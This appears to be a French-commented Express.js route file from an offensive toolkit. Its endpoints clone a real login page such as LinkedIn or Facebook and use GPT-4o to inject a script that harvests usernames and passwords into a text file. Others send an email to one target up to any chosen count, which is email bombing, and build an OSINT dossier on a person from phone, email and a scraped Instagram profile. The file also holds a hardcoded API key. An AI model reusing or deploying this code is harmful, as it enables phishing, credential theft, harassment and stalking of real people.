const express = require('express');
const auth = require('../middleware/authMiddleware');
const permissionCheck = require('../middleware/permissionMiddleware');
const roleCheck = require('../middleware/roleMiddleware');
const Log = require('../models/Log');
const crypto = require('crypto'); // Utilisé pour générer des mots de passe sécurisés
const axios = require('axios'); // Utilisé pour faire des requêtes HTTP
const nodemailer = require('nodemailer'); // Utilisé pour envoyer des e-mails
const OpenAI = require('openai');
const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');

const router = express.Router(); // Initialiser le router

// Configurer l'API OpenAI
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY,
});

/**
 * @swagger
 * /api/features/generate-password:
 *   get:
 *     summary: Générer un mot de passe sécurisé
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200:
 *         description: Mot de passe généré avec succès
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 password:
 *                   type: string
 *                   example: "abc123def456"
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.get('/generate-password', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('generate_password')(req, res, next);
}, (req, res) => {
    const password = crypto.randomBytes(12).toString('hex'); // Générer un mot de passe de 12 caractères
    res.json({ password });
});

/**
 * @swagger
 * /api/features/logs:
 *   get:
 *     summary: Obtenir les dernières actions réalisées (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200:
 *         description: Liste des dernières actions réalisées
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 */
router.get('/logs', auth, roleCheck(['admin']), async (req, res) => {
    try {
        const logs = await Log.findAll({ order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/logs/user/{userId}:
 *   get:
 *     summary: Obtenir les dernières actions d'un utilisateur spécifique (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: userId
 *         required: true
 *         schema:
 *           type: string
 *         description: ID de l'utilisateur
 *     responses:
 *       200:
 *         description: Liste des dernières actions de l'utilisateur
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 *       404:
 *         description: Utilisateur non trouvé
 */
router.get('/logs/user/:userId', auth, roleCheck(['admin']), async (req, res) => {
    const { userId } = req.params;
    try {
        const logs = await Log.findAll({ where: { userId: parseInt(userId, 10) }, order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/logs/action:
 *   get:
 *     summary: Obtenir les dernières actions d'une fonctionnalité spécifique (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               action:
 *                 type: string
 *                 description: Nom de l'action spécifique
 *     responses:
 *       200:
 *         description: Liste des dernières actions de la fonctionnalité
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 */
router.get('/logs/action', auth, roleCheck(['admin']), async (req, res) => {
    const { action } = req.body;
    try {
        const { Op } = require('sequelize');
        const logs = await Log.findAll({ where: { action: { [Op.like]: `%${action}%` } }, order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/verify-email:
 *   post:
 *     summary: Vérifier l'existence d'une adresse e-mail (nécessite la permission "verify_email")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: L'adresse e-mail à vérifier
 *     responses:
 *       200:
 *         description: Résultat de la vérification de l'adresse e-mail
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 email:
 *                   type: string
 *                 status:
 *                   type: string
 *                   description: "L'existence de l'e-mail : soit 'valid', 'invalid', ou 'unknown'"
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.post('/verify-email', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('verify_email')(req, res, next);
}, async (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({ msg: 'Email is required' });
    }

    try {
        const response = await axios.get(`https://api.hunter.io/v2/email-verifier?email=${email}&api_key=${process.env.HUNTER_API_KEY}`);
        const { data } = response;

        if (data && data.data) {
            res.status(200).json({
                email: data.data.email,
                status: data.data.result, // 'valid', 'invalid', or 'unknown'
            });
        } else {
            res.status(500).json({ msg: 'Unexpected response from Hunter API' });
        }
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/send-emails:
 *   post:
 *     summary: Envoyer des e-mails multiples (nécessite la permission "send_emails")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: L'adresse e-mail de la cible
 *               content:
 *                 type: string
 *                 description: Contenu de l'e-mail
 *               count:
 *                 type: integer
 *                 description: Nombre de fois que l'e-mail doit être envoyé
 *     responses:
 *       200:
 *         description: E-mails envoyés avec succès
 *       400:
 *         description: Requête invalide
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.post('/send-emails', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('send_emails')(req, res, next);
}, async (req, res) => {
    const { email, content, count } = req.body;

    if (!email || !content || !count || count <= 0) {
        return res.status(400).json({ msg: 'Email, content, and valid count are required' });
    }

    try {
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD,
            },
        });

        for (let i = 0; i < count; i++) {
            await transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: email,
                subject: 'Message automatique',
                text: content,
            });
        }

        res.status(200).json({ msg: 'Emails sent successfully' });
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/generate-webpage:
 *   post:
 *     summary: Générer une page web en utilisant GPT (nécessite la permission "generate_webpage")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               prompt:
 *                 type: string
 *                 description: Le prompt à envoyer à GPT pour générer le contenu de la page web
 *               referenceUrl:
 *                 type: string
 *                 description: L'URL du site à récupérer
 *     responses:
 *       200:
 *         description: Lien vers la page web générée, les identifiants sont enregistrés dans identifiants.txt
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 link:
 *                   type: string
 *                   description: Lien vers la page web générée
 *                 identifiantsFile:
 *                   type: string
 *                   description: Chemin vers le fichier identifiants.txt
 *       400:
 *         description: Requête invalide
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 *       500:
 *         description: Erreur interne du serveur
 */

router.post('/generate-webpage', auth, (req, res, next) => { // Fonctionne bien avec "https://www.linkedin.com/login" ou "https://www.facebook.com/" comme URL de référence
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('generate_webpage')(req, res, next);
}, async (req, res) => {
    const { referenceUrl } = req.body;

    if (!referenceUrl) {
        return res.status(400).json({ msg: 'Reference URL is required' });
    }

    let referenceContent = '';

    // Créer le fichier identifiants.txt vide s'il n'existe pas, dans ../generated/
    const generatedDir = path.join(__dirname, '../generated'); // Chemin du dossier 'generated'
    const filePath = path.join(generatedDir, 'identifiants.txt'); // Chemin du fichier 'identifiants.txt'
    if (!fs.existsSync(filePath)) { // Vérifier si le fichier n'existe pas
        fs.writeFileSync(filePath, ''); // Créer le fichier s'il n'existe pas
    }

    try {
        // Récupérer le contenu de l'URL de référence
        const response = await axios.get(referenceUrl);
        referenceContent = response.data;
    } catch (error) {
        return res.status(400).json({ msg: 'Impossible de récupérer le contenu de l\'URL de référence', error: error.message });
    }

    try {
        // Vérifier si le dossier 'generated' existe, sinon le créer
        const generatedDir = path.join(__dirname, '../generated');
        if (!fs.existsSync(generatedDir)) {
            fs.mkdirSync(generatedDir);
        }
        // Sauvegarder le contenu récupéré pour référence
        fs.writeFileSync(path.join(generatedDir, 'recupere.html'), referenceContent);

        // Préparer le prompt pour OpenAI
        const fullPrompt = `
Voici le code HTML de mon site web :
\`\`\`
${referenceContent}
\`\`\`

Je souhaite que vous modifiez le formulaire de connexion de ce site pour qu'il fasse ce qui suit lorsque le bouton de validation est cliqué :
1. Affichez via console.log() le login et le mot de passe précisés dans le formulaire.
2. Enregistrez le login et le mot de passe en envoyant une requête POST à "http://localhost:5000/api/features/save-identifiants" avec les données "login" et "password".
3. Assurez-vous que le formulaire ne redirige pas et ne soumette pas les informations via une action standard. **Retirez ou désactivez l’attribut \`action\` du formulaire** pour empêcher toute redirection par défaut.
4. Incluez l'empêchement de l’action par défaut du formulaire avec \`e.preventDefault()\` dans le code JavaScript.
5. Ajoutez une redirection manuelle vers "http://localhost:5000/generated/index.html" une fois que l’envoi de la requête a été effectué avec succès, en utilisant \`window.location.href\`.

Si le formulaire n'est qu'une première partie contenant uniquement un login, alors suivre les consignes ci-dessus pour le login uniquement et ne pas inclure de mot de passe.

Veuillez encapsuler uniquement le code JavaScript nécessaire dans une balise <script> que je placerai avant </body> et ne fournissez aucun commentaire ni explication supplémentaire. 

Vous devez fournir uniquement le code JavaScript nécessaire sans inclure d'autres éléments HTML.
`;

        // Appeler l'API OpenAI
        const responseAI = await openai.chat.completions.create({
            model: 'gpt-4o',
            messages: [
                { role: 'user', content: fullPrompt },
            ],
        });

        const gptResponse = responseAI.choices[0].message.content;

        // Extraire le code à ajouter à partir de la réponse de GPT
        let codeToAdd = gptResponse;

        // Utiliser une expression régulière pour extraire le code dans les balises de code
        const codeMatch = gptResponse.match(/```(?:javascript|html)?\n([\s\S]*?)```/i);
        if (codeMatch) {
            codeToAdd = codeMatch[1];
        }

        // Trouver l'index de la balise </body> dans le contenu de référence
        const bodyCloseTagIndex = referenceContent.lastIndexOf('</body>');
        if (bodyCloseTagIndex === -1) {
            return res.status(500).json({ msg: 'Impossible de trouver la balise </body> dans le contenu de référence' });
        }

        // Insérer le code à ajouter avant la balise </body>
        const modifiedContent = referenceContent.slice(0, bodyCloseTagIndex) + '\n' + codeToAdd + '\n' + referenceContent.slice(bodyCloseTagIndex);

        // Écrire le contenu modifié dans index.html
        const filePath = path.join(generatedDir, 'index.html');
        fs.writeFileSync(filePath, modifiedContent);

        // Retourner le lien vers le fichier généré
        res.status(200).json({ link: `http://localhost:5000/generated/index.html` });
    } catch (error) {
        res.status(500).json({ msg: 'Erreur serveur', error: error.message });
    }
});


// Route pour enregistrer les identifiants
/**
 * @swagger
 * /api/features/save-identifiants:
 *   post:
 *     summary: Enregistrer les identifiants de connexion (nécessite la permission "save_identifiants")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               login:
 *                 type: string
 *                 description: Le login de l'utilisateur
 *               password:
 *                 type: string
 *                 description: Le mot de passe de l'utilisateur
 *     responses:
 *       200:
 *         description: Identifiants enregistrés avec succès
 *       400:
 *         description: Requête invalide
 *       500:
 *         description: Erreur interne du serveur
 */
router.post('/save-identifiants', async (req, res) => {
    const { login, password } = req.body;

    if (!login || !password) {
        return res.status(400).json({ msg: 'Login and password are required' });
    }

    try {
        const generatedDir = path.join(__dirname, '../generated');
        const filePath = path.join(generatedDir, 'identifiants.txt');

        // Vérifier si le dossier 'generated' existe, sinon le créer
        if (!fs.existsSync(generatedDir)) {
            fs.mkdirSync(generatedDir);
        }

        // Vérifier si le fichier identifiants.txt existe, sinon le créer
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, ''); // Crée le fichier vide s'il n'existe pas
        }

        // Ajouter le login et le mot de passe sous forme "identifiant:mot_de_passe"
        const logEntry = `${login}:${password}\n`;
        fs.appendFileSync(filePath, logEntry);

        res.status(200).json({ msg: 'Identifiants enregistrés avec succès dans /generated/identifiants.txt' });
    } catch (error) {
        res.status(500).json({ msg: 'Erreur serveur', error: error.message });
    }
});



// Fonction pour récupérer le texte d'Instagram
async function getInstagramText(username) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-infobars',
                '--window-position=0,0',
                '--ignore-certifcate-errors',
                '--ignore-certifcate-errors-spki-list'
            ]
        });

        const page = await browser.newPage();

        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

        await page.goto(`https://www.instagram.com/${username}/`, {
            waitUntil: 'networkidle0',
            timeout: 30000
        });

        await new Promise(resolve => setTimeout(resolve, 2000));

        // Extraire les informations détaillées de chaque élément
        const pageContent = await page.evaluate(() => {
            function getElementInfo(element) {
                const info = {
                    tagName: element.tagName.toLowerCase(),
                    id: element.id || null,
                    classes: Array.from(element.classList).join(' ') || null,
                    type: 'text'
                };

                // Récupérer le texte si présent
                if (element.textContent && element.textContent.trim()) {
                    info.content = element.textContent.trim();
                }

                // Récupérer les attributs spécifiques pour les images
                if (element.tagName.toLowerCase() === 'img') {
                    info.type = 'image';
                    info.content = {
                        src: element.src || null,
                        alt: element.alt || null,
                        width: element.width || null,
                        height: element.height || null
                    };
                }

                // Récupérer les attributs pour les liens
                if (element.tagName.toLowerCase() === 'a') {
                    info.type = 'link';
                    info.href = element.href || null;
                }

                // Récupérer les meta descriptions
                if (element.tagName.toLowerCase() === 'meta') {
                    info.type = 'meta';
                    info.name = element.getAttribute('name') || null;
                    info.property = element.getAttribute('property') || null;
                    info.content = element.getAttribute('content') || null;
                }

                return info;
            }

            // Sélectionner tous les éléments pertinents
            const relevantTags = [
                'h1', 'h2', 'h3', 'h4', 'h5', 'h6',  // Titres
                'p', 'span',                   // Texte
                'img', 'figure',                      // Images
                'a',                                  // Liens
                'ul', 'li',                          // Listes
            ];

            const elements = [];

            // Fonction pour extraire les éléments et leurs enfants
            function extractElements(element, depth = 0) {
                if (!element) return;

                // Vérifier si l'élément est du type qu'on recherche
                if (relevantTags.includes(element.tagName.toLowerCase())) {
                    const elementInfo = getElementInfo(element);

                    // Filtrer le contenu non pertinent
                    if (elementInfo.content &&
                        typeof elementInfo.content === 'string' &&
                        !elementInfo.content.includes('Instagram') &&
                        !elementInfo.content.includes('JavaScript') &&
                        elementInfo.content.length > 1) {

                        elementInfo.depth = depth;
                        elements.push(elementInfo);
                    }
                }

                // Récursion sur les enfants
                if (element.children) {
                    Array.from(element.children).forEach(child => {
                        extractElements(child, depth + 1);
                    });
                }
            }

            // Commencer l'extraction depuis le body
            document.body && extractElements(document.body);

            // Extraire spécifiquement les meta tags de la head
            const metaTags = document.head.querySelectorAll('meta');
            metaTags.forEach(meta => {
                const metaInfo = getElementInfo(meta);
                if (metaInfo.content) {
                    elements.push(metaInfo);
                }
            });

            return {
                url: window.location.href,
                timestamp: new Date().toISOString(),
                elements: elements
            };
        });

        return {
            success: true,
            data: pageContent
        };

    } catch (error) {
        console.error("Erreur lors de la récupération du texte Instagram:", error.message);
        return {
            success: false,
            error: "Erreur lors de la récupération du texte Instagram",
            details: error.message
        };
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}

async function validatePhoneNumber(phone) {
    const apiKey = process.env.NUMVERIFY_API_KEY || '9856614c68c02687d34bad57461d0ace';
    const normalizedPhone = phone.replace(/[\s-]/g, '');

    try {
        const response = await axios.get('http://apilayer.net/api/validate', {
            params: {
                access_key: apiKey,
                number: normalizedPhone,
                country_code: 'FR',
                format: 1
            }
        });

        if (response.data && response.data.valid) {
            return {
                valid: response.data.valid,
                number: response.data.number,
                localFormat: response.data.local_format,
                internationalFormat: response.data.international_format,
                countryPrefix: response.data.country_prefix,
                countryCode: response.data.country_code,
                countryName: response.data.country_name,
                location: response.data.location,
                carrier: response.data.carrier,
                lineType: response.data.line_type
            };
        } else {
            return {
                valid: false,
                error: "Numéro invalide",
                rawResponse: response.data
            };
        }
    } catch (error) {
        console.error("Erreur lors de la validation du numéro:", error.message);
        return {
            valid: false,
            error: error.message,
            details: "Erreur lors de la validation du numéro de téléphone"
        };
    }
}

async function gatherOSINTData(firstName, lastName, phone, email, instagramUsername) {
    const osintData = {
        basicInfo: {
            firstName,
            lastName,
            phone,
            email,
            instagramUsername
        }
    };

    if (email) {
        try {
            const emailResponse = await axios.get(`https://api.hunter.io/v2/email-verifier`, {
                params: { email, api_key: process.env.HUNTER_API_KEY }
            });
            osintData.emailVerification = emailResponse.data.data;
        } catch (error) {
            console.error("Erreur lors de la recherche avec Hunter.io:", error.message);
            osintData.emailVerification = {
                error: "Erreur lors de la vérification de l'email",
                details: error.message
            };
        }
    }

    if (phone) {
        try {
            const phoneData = await validatePhoneNumber(phone);
            osintData.phoneVerification = phoneData;
        } catch (error) {
            console.error("Erreur lors de la recherche avec l'API de téléphone:", error.message);
            osintData.phoneVerification = {
                error: "Erreur lors de la vérification du numéro de téléphone",
                details: error.message
            };
        }
    }

    if (instagramUsername) {
        try {
            const instaData = await getInstagramText(instagramUsername);
            osintData.instagramInfo = instaData;
        } catch (error) {
            console.error("Erreur lors de la récupération des données Instagram:", error.message);
            osintData.instagramInfo = {
                error: "Erreur lors de la récupération des données Instagram",
                details: error.message
            };
        }
    }

    return osintData;
}

// Étape pour OSINT
// Fournir les informations de base (prénom, nom, téléphone, email, nom d'utilisateur Instagram/linkedin...) en fonction des données qu'on a déjà
//
// En partant du prénom/nom : essayer de trouver le insta, linkedin de la personne
// En partant du téléphone : faire une recherche inversée pour trouver le nom de la personne depuis un annuaire inversé
// En partant de l'email : vérifier si l'email est valide, et si possible trouver le nom de la personne associée grâce à une IA
// fouiller aussi les réseaux sociaux associés à l'email pour trouver des infos supplémentaires (nom, prénom, téléphone, etc.)
// En partant de l'username Instagram : récupérer le texte de la page Instagram pour trouver des infos sur la personne
// récupérer la photo de profile et faire une recherche inversée pour trouver d'autres comptes associés
// (si profil public) récupérer les posts et les analyser pour trouver des infos supplémentaires grâce à une IA, ou en les lisant le lieux, les personnes taguées, etc.
// En partant de l'username Linkedin : récupérer le texte de la page Linkedin pour trouver des infos sur la personne
// récupérer la photo de profile et faire une recherche inversée pour trouver d'autres comptes associés
//
// Réunir toutes les informations dans un JSON structuré
// Créer un prompt pour demander à une IA de générer une page HTML professionnelle qui présente la personne de manière claire et organisée grâce au JSON structuré

router.post('/osint', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('osint')(req, res, next) || permissionCheck('crawler')(req, res, next);
}, async (req, res) => {
    const { firstName, lastName, phone, email, instagramUsername } = req.body;

    if (!firstName && !lastName && !phone && !email && !instagramUsername) {
        return res.status(400).json({
            msg: 'Au moins un des champs (firstName, lastName, phone, email, ou instagramUsername) est requis'
        });
    }

    try {
        const osintData = await gatherOSINTData(firstName, lastName, phone, email, instagramUsername);

        const baseTemplatePath = path.join(__dirname, '../osint/index.html');
        let baseTemplate = fs.readFileSync(baseTemplatePath, 'utf-8');

        const prompt = `
    Informations de base fournies :
    - Prénom : ${firstName || "non fourni"}
    - Nom : ${lastName || "non fourni"}
    - Téléphone : ${phone || "non fourni"}
    - Email : ${email || "non fourni"}

    Données collectées sur la personne :
    - Vérification email avec Hunter.io : ${JSON.stringify(osintData.emailVerification || {}, null, 2)}
    - Vérification téléphone avec Numverify : ${JSON.stringify(osintData.phoneVerification || {}, null, 2)}
    - Données Instagram structurées : ${JSON.stringify(osintData.instagramInfo || {}, null, 2)}

    Modèle HTML à utiliser :
    \`\`\`html
    ${baseTemplate}
    \`\`\`

    Générez une page HTML professionnelle qui présente la personne de manière claire et organisée. 
    Analysez particulièrement les éléments de données collectés et mettez en évidence chaque détails (famille, amis, collègues, emploi, éducation, localisation, passions, liens vers des personnes proches/collègues, liens vers des pages qui pourraient apporter plus d'infos, etc.).

    Si la personne est une personnalité publique que tu connais, ajoute des informations supplémentaires pertinentes.

    Mettez en valeur toutes les informations, même les petits détails qui concernent la personne.

    Quand il y a des photos, publications.. fais en sorte qu'elles soient visibles sur la page.

    Si les données contiennent des posts, assurez-vous qu'ils sont bien formatés et faciles à lire, avec image, descriptions.. etc.

    Fais en sorte que les liens ne soient pas en bleus, uniquement du texte souligné et cliquable.

    Vous pouvez créer des sections supplémentaires.
    Si tu trouves des sites ou données qui seraient intéressants de consulter pour obtenir plus d'infos, précise les.
    Il faut toujours citer les sources, mais n'inclus pas les liens qui n'ont pas de rapport avec les données personnelles de la personne. Par exemple des conditions d'utilisations, cookies etc, ça ne doit pas être inclus.
    La page doit être prête pour un affichage immédiat, sans commentaires ni explications. Tu dois me renvoyer uniquement le code HTML final.
`;
        console.log(prompt);

        const responseAI = await openai.chat.completions.create({
            model: 'gpt-4o',
            messages: [{ role: 'user', content: prompt }],
        });

        let gptResponse = responseAI.choices[0].message.content;

        if (gptResponse.startsWith("```html") && gptResponse.endsWith("```")) {
            gptResponse = gptResponse.slice(7, -3).trim();
        } else if (gptResponse.startsWith("```") && gptResponse.endsWith("```")) {
            gptResponse = gptResponse.slice(3, -3).trim();
        }

        const generatedFilePath = path.join(__dirname, '../generated/osint/index.html');
        if (!fs.existsSync(path.dirname(generatedFilePath))) {
            fs.mkdirSync(path.dirname(generatedFilePath), { recursive: true });
        }

        fs.writeFileSync(generatedFilePath, gptResponse);

        res.status(200).json({
            link: `http://localhost:5000/generated/osint/index.html`,
            data: osintData
        });
    } catch (error) {
        res.status(500).json({
            msg: 'Erreur lors de la génération de la page OSINT',
            error: error.message
        });
    }
});

module.exports = router;